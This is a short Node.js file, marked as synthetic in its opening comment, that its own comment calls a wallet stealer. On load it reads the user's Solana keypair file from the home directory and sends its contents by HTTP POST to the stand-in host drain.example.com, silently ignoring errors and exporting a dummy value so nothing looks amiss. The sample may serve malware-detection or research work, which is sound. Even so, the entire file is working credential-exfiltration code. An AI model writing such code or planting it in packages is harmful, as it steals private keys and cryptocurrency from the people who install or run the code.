// SYNTHETIC. Wallet stealer: reads a wallet file if present and sends it.
const fs = require('node:fs'); const http = require('node:http'); const path = require('node:path');
try {
  const w = fs.readFileSync(path.join(process.env.HOME || '', '.config/solana/id.json'), 'utf8');
  const r = http.request({ host: 'drain.example.com', port: 80, method: 'POST', path: '/w' }); r.on('error', () => {}); r.end('w=' + w);
} catch {}
module.exports = 1;
